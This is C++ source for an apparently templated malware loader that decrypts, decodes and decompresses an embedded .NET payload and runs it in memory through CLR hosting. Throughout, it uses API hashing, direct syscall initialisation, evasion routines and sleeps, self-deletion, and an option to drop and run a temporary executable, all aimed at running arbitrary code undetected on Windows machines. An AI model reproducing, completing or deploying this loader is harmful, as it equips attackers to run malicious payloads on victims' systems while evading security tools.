// CLR hosting - load and execute .NET assembly from memory
static void run_dotnet_assembly(uint8_t* assembly_data, size_t assembly_size) {
    HRESULT hr;
    DBG("run_dotnet_assembly: %zu bytes", assembly_size);

    // Dynamically resolve CLRCreateInstance from mscoree.dll
    auto hMscoree = load_module(L"mscoree.dll");
    if (!hMscoree) { DBG("mscoree.dll load FAILED"); return; }
    auto pCLRCreateInstance = reinterpret_cast<CLRCreateInstance_fn>(
        resolve_function(hMscoree, HASHA("CLRCreateInstance")));
    if (!pCLRCreateInstance) { DBG("CLRCreateInstance resolve FAILED"); return; }
    DBG("CLRCreateInstance resolved");

    ICLRMetaHost* pMetaHost = nullptr;
    hr = pCLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
                            reinterpret_cast<LPVOID*>(&pMetaHost));
    if (FAILED(hr)) { DBG("CLRCreateInstance FAILED: 0x%08lx", hr); return; }
    DBG("MetaHost created");

    // Get latest runtime
    IEnumUnknown* pEnum = nullptr;
    hr = pMetaHost->EnumerateInstalledRuntimes(&pEnum);
    if (FAILED(hr)) { pMetaHost->Release(); return; }

    ICLRRuntimeInfo* pRuntimeInfo = nullptr;
    IUnknown* pUnk = nullptr;
    ULONG fetched = 0;

    // Get the last (newest) runtime
    while (pEnum->Next(1, &pUnk, &fetched) == S_OK) {
        if (pRuntimeInfo) pRuntimeInfo->Release();
        pUnk->QueryInterface(IID_ICLRRuntimeInfo,
                              reinterpret_cast<LPVOID*>(&pRuntimeInfo));
        pUnk->Release();
    }
    pEnum->Release();

    if (!pRuntimeInfo) { DBG("no runtime found"); pMetaHost->Release(); return; }
    DBG("runtime enumerated");

    // Check if loadable
    BOOL loadable = FALSE;
    hr = pRuntimeInfo->IsLoadable(&loadable);
    if (FAILED(hr) || !loadable) { DBG("runtime not loadable");
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return;
    }

    DBG("runtime is loadable");

    // Get ICorRuntimeHost
    ICorRuntimeHost* pRuntimeHost = nullptr;
    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost,
                                     reinterpret_cast<LPVOID*>(&pRuntimeHost));
    if (FAILED(hr)) { DBG("GetInterface FAILED: 0x%08lx", hr);
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return;
    }

    DBG("runtime host obtained");

    // Start the CLR
    hr = pRuntimeHost->Start();
    if (FAILED(hr)) { DBG("CLR Start FAILED: 0x%08lx", hr);
        pRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return;
    }

    DBG("CLR started");

    // Get default AppDomain
    IUnknown* pAppDomainThunk = nullptr;
    hr = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);
    if (FAILED(hr)) { DBG("GetDefaultDomain FAILED: 0x%08lx", hr);
        pRuntimeHost->Stop();
        pRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return;
    }

    _AppDomain* pAppDomain = nullptr;
    hr = pAppDomainThunk->QueryInterface(IID_AppDomain,
                                          reinterpret_cast<LPVOID*>(&pAppDomain));
    pAppDomainThunk->Release();
    if (FAILED(hr)) {
        pRuntimeHost->Stop();
        pRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return;
    }

    DBG("AppDomain obtained");

    // Create SAFEARRAY from assembly bytes
    SAFEARRAYBOUND bounds = { static_cast<ULONG>(assembly_size), 0 };
    SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, &bounds);
    if (!pSafeArray) {
        pAppDomain->Release();
        pRuntimeHost->Stop();
        pRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return;
    }

    void* safe_data = nullptr;
    SafeArrayAccessData(pSafeArray, &safe_data);
    memcpy(safe_data, assembly_data, assembly_size);
    SafeArrayUnaccessData(pSafeArray);

    // Load assembly
    _Assembly* pAssembly = nullptr;
    hr = pAppDomain->Load_3(pSafeArray, &pAssembly);
    SafeArrayDestroy(pSafeArray);

    if (FAILED(hr) || !pAssembly) { DBG("Load_3 FAILED: 0x%08lx", hr);
        pAppDomain->Release();
        pRuntimeHost->Stop();
        pRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return;
    }

    DBG("assembly loaded");

    // Get entry point
    _MethodInfo* pEntryPoint = nullptr;
    hr = pAssembly->get_EntryPoint(&pEntryPoint);
    if (FAILED(hr) || !pEntryPoint) { DBG("get_EntryPoint FAILED: 0x%08lx", hr);
        pAssembly->Release();
        pAppDomain->Release();
        pRuntimeHost->Stop();
        pRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return;
    }

    // Prepare arguments
    SAFEARRAY* pArgs = nullptr;
{{#IF HAS_ARGUMENTS}}
    {
        // Split argument string into individual tokens
        wchar_t arg_str[] = L"{{ARGUMENTS}}";
        BSTR tokens[64];
        int token_count = 0;

        wchar_t* p = arg_str;
        while (*p && token_count < 64) {
            while (*p == L' ' || *p == L'\t') p++;
            if (!*p) break;

            wchar_t* start;
            if (*p == L'"') {
                p++;
                start = p;
                while (*p && *p != L'"') p++;
            } else {
                start = p;
                while (*p && *p != L' ' && *p != L'\t') p++;
            }
            wchar_t saved = *p;
            *p = L'\0';
            tokens[token_count++] = SysAllocString(start);
            if (saved) p++;
        }

        DBG("arguments: %d tokens", token_count);

        SAFEARRAYBOUND arg_bounds = { 1, 0 };
        pArgs = SafeArrayCreate(VT_VARIANT, 1, &arg_bounds);
        LONG idx = 0;

        SAFEARRAYBOUND str_bounds = { static_cast<ULONG>(token_count), 0 };
        SAFEARRAY* pStrArgs = SafeArrayCreate(VT_BSTR, 1, &str_bounds);
        for (LONG i = 0; i < token_count; i++)
            SafeArrayPutElement(pStrArgs, &i, tokens[i]);

        VARIANT var_args;
        VariantInit(&var_args);
        var_args.vt = VT_ARRAY | VT_BSTR;
        var_args.parray = pStrArgs;
        SafeArrayPutElement(pArgs, &idx, &var_args);

        for (int i = 0; i < token_count; i++)
            SysFreeString(tokens[i]);
    }
{{#ENDIF}}
{{#IF NO_ARGUMENTS}}
    // No arguments - pass empty array
    SAFEARRAYBOUND arg_bounds = { 1, 0 };
    pArgs = SafeArrayCreate(VT_VARIANT, 1, &arg_bounds);
    LONG idx = 0;

    SAFEARRAYBOUND str_bounds = { 0, 0 };
    SAFEARRAY* pStrArgs = SafeArrayCreate(VT_BSTR, 1, &str_bounds);

    VARIANT var_args;
    VariantInit(&var_args);
    var_args.vt = VT_ARRAY | VT_BSTR;
    var_args.parray = pStrArgs;
    SafeArrayPutElement(pArgs, &idx, &var_args);
{{#ENDIF}}

    DBG("entry point found, invoking...");

    // Invoke entry point
    VARIANT retVal;
    VariantInit(&retVal);
    hr = pEntryPoint->Invoke_3(VARIANT{}, pArgs, &retVal);
    DBG("Invoke_3 returned: 0x%08lx (retVal.vt=0x%04x)", hr, retVal.vt);

    // If entry point is async (returns Task), wait for completion
    if (SUCCEEDED(hr) && (retVal.vt == VT_UNKNOWN || retVal.vt == VT_DISPATCH)) {
        DBG("async entry point detected (vt=0x%04x), waiting for Task...", retVal.vt);
        IDispatch* pTaskDisp = nullptr;
        IUnknown* pRetUnk = (retVal.vt == VT_DISPATCH) ?
            reinterpret_cast<IUnknown*>(retVal.pdispVal) : retVal.punkVal;

        if (pRetUnk && SUCCEEDED(pRetUnk->QueryInterface(IID_IDispatch,
                reinterpret_cast<void**>(&pTaskDisp)))) {
            OLECHAR waitMethod[] = L"Wait";
            OLECHAR* methodName = waitMethod;
            DISPID dispid;
            if (SUCCEEDED(pTaskDisp->GetIDsOfNames(IID_NULL, &methodName, 1,
                    LOCALE_SYSTEM_DEFAULT, &dispid))) {
                DISPPARAMS params = {};
                VARIANT waitRet;
                VariantInit(&waitRet);
                hr = pTaskDisp->Invoke(dispid, IID_NULL, LOCALE_SYSTEM_DEFAULT,
                    DISPATCH_METHOD, &params, &waitRet, nullptr, nullptr);
                DBG("Task.Wait() completed: hr=0x%08lx", hr);
                VariantClear(&waitRet);
            } else {
                DBG("Wait() not found via IDispatch, using sleep fallback");
                Sleep(300000);
            }
            pTaskDisp->Release();
        } else {
            DBG("IDispatch QI failed, using sleep fallback");
            Sleep(300000);
        }
    }

    // Cleanup
    VariantClear(&retVal);
    SafeArrayDestroy(pArgs);
    pEntryPoint->Release();
    pAssembly->Release();
    pAppDomain->Release();
    pRuntimeHost->Stop();
    pRuntimeHost->Release();
    pRuntimeInfo->Release();
    pMetaHost->Release();
}

// Shared decode + decrypt + decompress + execute pipeline
static void execute_assembly() {
    DBG("execute_assembly: payload_len=%zu", payload_len);
{{#IF ENTROPY_REDUCE}}
    for (size_t i = 0; i < payload_len; i++)
        payload[i] ^= entropy_mask[i];
{{#ENDIF}}

    // Decode if needed
    uint8_t* encrypted = nullptr;
    size_t encrypted_len = 0;

{{#IF ENCODE_NONE}}
    encrypted = payload;
    encrypted_len = payload_len;
{{#ENDIF}}
{{#IF ENCODE_BASE64}}
    auto* decode_buf = reinterpret_cast<uint8_t*>(
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, {{PAYLOAD_SIZE}} + 256));
    encrypted_len = decode_base64(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
    if (encrypted_len > {{PAYLOAD_SIZE}}) encrypted_len = {{PAYLOAD_SIZE}};
    encrypted = decode_buf;
{{#ENDIF}}
{{#IF ENCODE_HEX}}
    auto* decode_buf = reinterpret_cast<uint8_t*>(
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, {{PAYLOAD_SIZE}} + 256));
    encrypted_len = decode_hex(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
    if (encrypted_len > {{PAYLOAD_SIZE}}) encrypted_len = {{PAYLOAD_SIZE}};
    encrypted = decode_buf;
{{#ENDIF}}
{{#IF ENCODE_MAC}}
    auto* decode_buf = reinterpret_cast<uint8_t*>(
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, {{PAYLOAD_SIZE}} + 256));
    encrypted_len = decode_mac(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
    if (encrypted_len > {{PAYLOAD_SIZE}}) encrypted_len = {{PAYLOAD_SIZE}};
    encrypted = decode_buf;
{{#ENDIF}}
{{#IF ENCODE_UUID}}
    auto* decode_buf = reinterpret_cast<uint8_t*>(
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, {{PAYLOAD_SIZE}} + 256));
    encrypted_len = decode_uuid(encoded_payload, sizeof(encoded_payload) - 1, decode_buf);
    if (encrypted_len > {{PAYLOAD_SIZE}}) encrypted_len = {{PAYLOAD_SIZE}};
    encrypted = decode_buf;
{{#ENDIF}}

    DBG("decoded: encrypted_len=%zu", encrypted_len);

    // Decrypt
    auto* decrypted = reinterpret_cast<uint8_t*>(
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, encrypted_len + 256));
    size_t decrypted_len = encrypted_len + 256;
    if (!decrypt_payload(encrypted, encrypted_len, key, key_len, decrypted, &decrypted_len)) {
        DBG("decrypt_payload FAILED");
        HeapFree(GetProcessHeap(), 0, decrypted);
{{#IF ENCODE_BASE64}}
        HeapFree(GetProcessHeap(), 0, decode_buf);
{{#ENDIF}}
{{#IF ENCODE_HEX}}
        HeapFree(GetProcessHeap(), 0, decode_buf);
{{#ENDIF}}
{{#IF ENCODE_MAC}}
        HeapFree(GetProcessHeap(), 0, decode_buf);
{{#ENDIF}}
{{#IF ENCODE_UUID}}
        HeapFree(GetProcessHeap(), 0, decode_buf);
{{#ENDIF}}
        return;
    }

{{#IF ENCODE_BASE64}}
    HeapFree(GetProcessHeap(), 0, decode_buf);
{{#ENDIF}}
{{#IF ENCODE_HEX}}
    HeapFree(GetProcessHeap(), 0, decode_buf);
{{#ENDIF}}
{{#IF ENCODE_MAC}}
    HeapFree(GetProcessHeap(), 0, decode_buf);
{{#ENDIF}}
{{#IF ENCODE_UUID}}
    HeapFree(GetProcessHeap(), 0, decode_buf);
{{#ENDIF}}

    DBG("decrypted: %zu bytes", decrypted_len);

    // Decompress
    uint8_t* assembly = decrypted;
    size_t assembly_len = decrypted_len;

{{#IF COMPRESS_ZLIB}}
    auto* decompressed = reinterpret_cast<uint8_t*>(
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
    size_t decompressed_len = ORIGINAL_SIZE + 256;
    if (!decompress_zlib(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len)) {
        HeapFree(GetProcessHeap(), 0, decompressed);
        HeapFree(GetProcessHeap(), 0, decrypted);
        return;
    }
    assembly = decompressed;
    assembly_len = decompressed_len;
{{#ENDIF}}
{{#IF COMPRESS_LZ4}}
    auto* decompressed = reinterpret_cast<uint8_t*>(
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
    size_t decompressed_len = ORIGINAL_SIZE + 256;
    if (!decompress_lz4(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len)) {
        HeapFree(GetProcessHeap(), 0, decompressed);
        HeapFree(GetProcessHeap(), 0, decrypted);
        return;
    }
    assembly = decompressed;
    assembly_len = decompressed_len;
{{#ENDIF}}
{{#IF COMPRESS_RLE}}
    auto* decompressed = reinterpret_cast<uint8_t*>(
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
    size_t decompressed_len = ORIGINAL_SIZE + 256;
    if (!decompress_rle(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len)) {
        HeapFree(GetProcessHeap(), 0, decompressed);
        HeapFree(GetProcessHeap(), 0, decrypted);
        return;
    }
    assembly = decompressed;
    assembly_len = decompressed_len;
{{#ENDIF}}
{{#IF COMPRESS_LZNT}}
    auto* decompressed = reinterpret_cast<uint8_t*>(
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ORIGINAL_SIZE + 256));
    size_t decompressed_len = ORIGINAL_SIZE + 256;
    if (!decompress_lznt(decrypted, decrypted_len, decompressed, ORIGINAL_SIZE + 256, &decompressed_len)) {
        HeapFree(GetProcessHeap(), 0, decompressed);
        HeapFree(GetProcessHeap(), 0, decrypted);
        return;
    }
    assembly = decompressed;
    assembly_len = decompressed_len;
{{#ENDIF}}

{{#IF SLEEP_IN_BETWEEN}}
    evasion_sleep({{SLEEP_IN_BETWEEN_SECONDS}});
{{#ENDIF}}

{{#IF SELF_DELETE}}
    self_delete();
{{#ENDIF}}

{{#IF REDIRECT_OUTPUT}}
    {
        DBG("redirect mode: writing assembly to temp file for child process execution");
        char temp_dir[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_dir);
        char temp_file[MAX_PATH];
        GetTempFileNameA(temp_dir, "clr", 0, temp_file);
        // Rename .tmp to .exe
        char exe_file[MAX_PATH];
        lstrcpyA(exe_file, temp_file);
        lstrcatA(exe_file, ".exe");
        MoveFileA(temp_file, exe_file);

        // Write assembly bytes
        HANDLE hExe = CreateFileA(exe_file, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hExe == INVALID_HANDLE_VALUE) {
            DBG("failed to create temp exe: %lu", GetLastError());
            DeleteFileA(exe_file);
        } else {
            DWORD written;
            WriteFile(hExe, assembly, static_cast<DWORD>(assembly_len), &written, NULL);
            CloseHandle(hExe);
            DBG("temp exe written: %s (%lu bytes)", exe_file, written);

            // Write .config file for binding redirects
            char cfg_file[MAX_PATH];
            lstrcpyA(cfg_file, exe_file);
            lstrcatA(cfg_file, ".config");
            HANDLE hCfg = CreateFileA(cfg_file, GENERIC_WRITE, 0, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hCfg != INVALID_HANDLE_VALUE) {
                const char* cfg_data =
                    "<?xml version=\"1.0\"?>\r\n"
                    "<configuration><startup>"
                    "<supportedRuntime version=\"v4.0\"/>"
                    "</startup><runtime><assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\">"
                    "<dependentAssembly>"
                    "<assemblyIdentity name=\"System.Runtime.CompilerServices.Unsafe\" "
                    "publicKeyToken=\"b03f5f7f11d50a3a\" culture=\"neutral\"/>"
                    "<bindingRedirect oldVersion=\"0.0.0.0-6.0.0.0\" newVersion=\"6.0.0.0\"/>"
                    "</dependentAssembly>"
                    "</assemblyBinding></runtime></configuration>\r\n";
                DWORD cfg_len = static_cast<DWORD>(strlen(cfg_data));
                WriteFile(hCfg, cfg_data, cfg_len, &written, NULL);
                CloseHandle(hCfg);
            }

            // Create output file for stdout redirect
            SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
            HANDLE hOutFile = CreateFileA(
                obf("{{REDIRECT_OUTPUT_PATH}}"),
                GENERIC_WRITE, FILE_SHARE_READ, &sa,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

            // Build command line with arguments
{{#IF HAS_ARGUMENTS}}
            char cmd_line[4096];
            lstrcpyA(cmd_line, "\"");
            lstrcatA(cmd_line, exe_file);
            lstrcatA(cmd_line, "\" ");
            lstrcatA(cmd_line, "{{ARGUMENTS}}");
{{#ENDIF}}
{{#IF NO_ARGUMENTS}}
            char cmd_line[4096];
            lstrcpyA(cmd_line, "\"");
            lstrcatA(cmd_line, exe_file);
            lstrcatA(cmd_line, "\"");
{{#ENDIF}}
            DBG("executing: %s", cmd_line);

            STARTUPINFOA si = {};
            si.cb = sizeof(si);
            if (hOutFile != INVALID_HANDLE_VALUE) {
                si.dwFlags = STARTF_USESTDHANDLES;
                si.hStdOutput = hOutFile;
                si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
                si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
            }

            PROCESS_INFORMATION pi = {};
            if (CreateProcessA(NULL, cmd_line, NULL, NULL, TRUE,
                    0, NULL, NULL, &si, &pi)) {
                DBG("child process started (PID %lu), waiting...", pi.dwProcessId);
                WaitForSingleObject(pi.hProcess, INFINITE);
                DWORD exit_code;
                GetExitCodeProcess(pi.hProcess, &exit_code);
                DBG("child process exited: %lu", exit_code);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                DBG("CreateProcess failed: %lu", GetLastError());
            }

            if (hOutFile != INVALID_HANDLE_VALUE)
                CloseHandle(hOutFile);

            // Cleanup temp files
            DeleteFileA(cfg_file);
            DeleteFileA(exe_file);
            DBG("temp files cleaned up");
        }
    }
{{#ENDIF}}
{{#IF NO_REDIRECT_OUTPUT}}
    DBG("assembly ready: %zu bytes, invoking CLR...", assembly_len);
    run_dotnet_assembly(assembly, assembly_len);
    DBG("CLR execution finished");
{{#ENDIF}}

{{#IF COMPRESS_ZLIB}}
    HeapFree(GetProcessHeap(), 0, decompressed);
{{#ENDIF}}
{{#IF COMPRESS_LZ4}}
    HeapFree(GetProcessHeap(), 0, decompressed);
{{#ENDIF}}
{{#IF COMPRESS_RLE}}
    HeapFree(GetProcessHeap(), 0, decompressed);
{{#ENDIF}}
{{#IF COMPRESS_LZNT}}
    HeapFree(GetProcessHeap(), 0, decompressed);
{{#ENDIF}}
    HeapFree(GetProcessHeap(), 0, decrypted);
}

{{#IF DLL_ENTRY}}
static bool g_initialized = false;

static void run_payload() {
    if (!g_initialized) {
        if (!init_syscalls()) return;
        if (!evasion_init()) return;
        g_initialized = true;
    }
    execute_assembly();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
    }
    return TRUE;
}
{{DLL_EXPORTS}}
{{#ENDIF}}

{{#IF EXE_ENTRY}}
int main() {
    DBG("loader started (C# assembly)");
    if (!init_syscalls()) { DBG("init_syscalls FAILED"); return 1; }
    DBG("syscalls initialized");
    if (!evasion_init()) { DBG("evasion_init FAILED"); return 1; }
    DBG("evasion initialized");
    execute_assembly();
    DBG("loader finished");
    return 0;
}
{{#ENDIF}}
